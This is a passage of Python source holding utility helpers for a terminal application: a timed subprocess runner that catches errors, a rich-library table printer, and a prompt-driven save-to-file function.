# ---------- Utility helpers (real, not decorative) ----------

def _safe_run(cmd: list, timeout: float = 5.0) -> Tuple[int, str, str]:
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=False,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError) as exc:
        return -1, "", str(exc)


def _print_table(ctx, rows, headers):
    from rich.table import Table
    table = Table(header_style=f"bold {ctx['theme'].secondary}", border_style=ctx['theme'].border)
    for h in headers:
        table.add_column(h)
    for row in rows:
        table.add_row(*[str(c) for c in row])
    ctx["console"].print(table)


def _save_text(ctx, content: str, *, default_name: str = "output.txt") -> str:
    path = ctx["ask"]("Save to file (blank to skip)", default_name)
    if not path:
        return ""
    try:
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
        ctx["console"].print(f"[{ctx['theme'].success}]Saved {len(content)} bytes to {path}[/]")
        return path
    except OSError as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Save failed: {exc}[/]")
        return ""


